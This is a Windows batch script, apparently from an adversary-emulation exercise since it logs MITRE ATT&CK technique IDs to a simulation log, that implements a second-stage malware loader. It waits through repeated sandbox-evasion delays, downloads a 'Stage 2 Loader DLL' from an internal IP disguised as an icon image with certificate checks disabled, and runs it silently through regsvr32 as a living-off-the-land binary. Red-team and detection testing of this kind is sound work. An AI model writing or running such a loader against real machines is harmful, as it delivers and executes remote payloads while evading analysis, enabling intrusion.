@echo off
setlocal enabledelayedexpansion

REM Random-named SET variable declarations for all PHR_* placeholders
SET qw3rt6=%APPDATA%\10905\522c0741
SET yui7op=ab67fe6c.txt
SET asdfgh=https://10.0.0.49/stage/2/icon.png?10905-7
SET zxc9vb=BALAM-S2BO
SET bnm4jk=10905
SET hjk1lo=7
SET plm2ok=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once for debug logging
SET tsvar=!DATE!/!TIME!

REM --- Debug: heartbeat_start ---
echo [!tsvar!][DEBUG][!zxc9vb!][!bnm4jk!]: heartbeat_start>> "!plm2ok!" 2>nul

REM --- Initial Sandbox Evasion Delay (15 sec) ---
timeout /t 15 /nobreak >nul

REM --- Heartbeat fetch: download Stage 2 Loader DLL ---
curl -k -s -o "!qw3rt6!\!yui7op!" "!asdfgh!" 2>> "!plm2ok!" >nul

REM --- Debug: heartbeat_complete ---
echo [!tsvar!][DEBUG][!zxc9vb!][!bnm4jk!]: heartbeat_complete>> "!plm2ok!" 2>nul

REM --- Virtualization/Sandbox Evasion TTP: T1497 (delays count as evasion) ---
REM Log T1497 before delays (record start)
echo [!tsvar!][T1497][!zxc9vb!][!bnm4jk!]: T1497|Virtualization/Sandbox Evasion=[OK]:>> "!plm2ok!" 2>nul

REM --- Second delay (5 sec via ping) ---
ping -n 6 127.0.0.1 >nul

REM --- Third delay (random 10-30 sec) ---
SET /A rdelay=%RANDOM% %% 20 + 10
timeout /t !rdelay! /nobreak >nul

REM --- Fourth delay (8 sec via choice) ---
CHOICE /C Y /N /D Y /T 8 >nul

REM --- Debug: chdir_start ---
echo [!tsvar!][DEBUG][!zxc9vb!][!bnm4jk!]: chdir_start>> "!plm2ok!" 2>nul

REM --- Change working directory to output directory ---
cd /d "!qw3rt6!" >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [!tsvar!][DEBUG][!zxc9vb!][!bnm4jk!]: chdir_result=1>> "!plm2ok!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!zxc9vb!][!bnm4jk!]: chdir_result=0>> "!plm2ok!" 2>nul
)

REM --- Fifth delay (5 sec via timeout) ---
timeout /t 5 /nobreak >nul

REM --- Debug: rundll32_start (but we use regsvr32, so log as regsvr32_start) ---
echo [!tsvar!][DEBUG][!zxc9vb!][!bnm4jk!]: regsvr32_start>> "!plm2ok!" 2>nul

REM --- Invoke Stage 2 Loader DLL via regsvr32 LOLBIN ---
regsvr32.exe /s "!yui7op!" 2>> "!plm2ok!"

REM --- Debug: regsvr32_complete ---
echo [!tsvar!][DEBUG][!zxc9vb!][!bnm4jk!]: regsvr32_complete>> "!plm2ok!" 2>nul

REM --- Log T1218: System Binary Proxy Execution ---
echo [!tsvar!][T1218][!zxc9vb!][!bnm4jk!]: T1218|System Binary Proxy Execution=[OK]:>> "!plm2ok!" 2>nul

REM --- Final delay (sandbox evasion continuation) ---
ping -n 4 127.0.0.1 >nul

REM --- End of script ---
exit /b 0